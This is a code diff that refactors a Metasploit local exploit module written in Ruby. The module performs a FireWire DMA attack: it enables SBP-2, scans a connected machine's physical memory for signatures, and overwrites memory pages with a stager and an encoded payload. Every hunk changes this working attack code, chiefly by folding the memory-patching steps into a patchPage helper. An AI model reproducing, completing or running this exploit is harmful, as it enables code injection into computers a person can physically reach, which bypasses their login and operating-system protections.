@@ -1,4 +1,3 @@
-##
 require 'msf/core'
 require '~/.msf4/external/forensic1394/bus.rb'
 
@@ -68,33 +67,14 @@ class Metasploit3 < Msf::Exploit::Local
         b = Bus.new
         d = initialize_fw(b)
          
-        # Find memory size
-        memsize = 4 * 1024 * 1024  * 1024
-
         ##
         # Stage 1 of the attack
         ##
 
         # Attack
         puts 'Starting attack...'
-        begin        
-        # Find
-            addr = findsig(d, sig, off, memsize)
-            if !addr
-                fail('Signature not found.')
-            end
 
-        #    success = true
-            puts 'Signature found at 0x%x.' % addr
-            d.write(addr, stagerpatch)
-            if (d.read(addr, stagerpatch.length) == stagerpatch)
-                puts 'Patch confirmed'
-            end
-
-        rescue IOError => e
-        #    success = false
-            fail( 'I/O Error, make sure FireWire interfaces are properly connected.' + e.message )
-        end
+        patchPage(d,sig,stagerpatch,off)
 
         ##
         # Stage 2 of the attack
@@ -104,28 +84,13 @@ class Metasploit3 < Msf::Exploit::Local
                "\xc4\x04\xff\x64\x24\xfc"
         stagesig = "\xff\xe0"  
         patch = page + payload.encoded
+
         # Wait for user input
         puts 'Press enter if patch on target is run'
         gets
+
         puts 'Searching for payload page'
-        begin        
-        # Find
-            addr = findsig(d, stagesig, 0, memsize)
-            if !addr
-                fail('Signature not found.')
-            else
-         #       success = true
-                puts 'Signature found at 0x%x.' % addr
-                d.write(addr, patch)
-                if (d.read(addr, patch.length) == patch)
-                    puts 'Patch confirmed'
-                end
-            end 
-        rescue IOError => e
-         #   success = false
-            puts 'I/O Error, make sure FireWire interfaces are properly connected.'
-            puts e.message
-        end
+        patchPage(d, stagesig,patch, 0)
 
         ##
         # Stage 3
@@ -139,17 +104,13 @@ class Metasploit3 < Msf::Exploit::Local
         b.delete
  	end
 
-    def check
-
-    end
-    
     def initialize_fw(b)
         # Enable SBP-2 support to ensure we get DMA
         b.enable_sbp2()
 
         begin
             for i in 2.downto(1)
-                puts "[+] Initializing bus and enabling SBP2, please wait %2d seconds or press Ctrl+C \r" % i; 
+                puts "[+] Initializing bus and enabling SBP2, please wait %2d seconds or press Ctrl+C \r" % i
                 STDOUT.flush
                 sleep(1)
             end
@@ -159,16 +120,34 @@ class Metasploit3 < Msf::Exploit::Local
 
         # Open the first device
         d = b.devices
-        if (d.length > 0)
-            d = d[0]
-            d.open()
-            puts ''
-        else
-            raise 'nothing connected'
-        end
+        raise 'nothing connected' if d.length <= 0
+
+        d = d[0]
+        d.open()
+        puts ''
 
         return d
     end 
+
+    # Tries to find signature on a page at offset at device d 
+    def patchPage(d,sig,patch,off)
+
+        # Find memory size
+        memsize = 4 * 1024 * 1024  * 1024
+
+        begin        
+            addr = findsig(d, sig, off, memsize)
+            fail('Signature not found.') if !addr
+
+            puts 'Signature found at 0x%x.' % addr
+            d.write(addr, patch)
+            puts 'Patch NOT confirmed!' if d.read(addr, patch.length) != patch
+
+        rescue IOError => e
+            fail( e.message + ' Make sure FireWire interfaces are properly connected.' )
+        end
+    end
+
 
     def findsig(d, sig, off, memsize)
         pagesize = 4096 
@@ -176,17 +155,12 @@ class Metasploit3 < Msf::Exploit::Local
         one_mb = 3 * 1024 * 1024 * 1024
         
         for addr in (one_mb + off..memsize).step(pagesize)
-            data = d.read(addr, sig.length)
-            # print "Data found %s at %d \r" % [data.unpack('C*').map{ |b| "%02X" % b }.join(), addr]
-            # TODO: Fix ugly compare, should be direct compare of bin data and sig 
-            if (data  == sig)
-                return addr
-            end
+            return addr if sig == d.read(addr, sig.length)
         end
     end          
 
     def fail(msg)
-        puts "\n [!] Attack unsuccessful." + msg
+        puts "\n [!] Attack unsuccessful. " + msg
         exit
     end
 
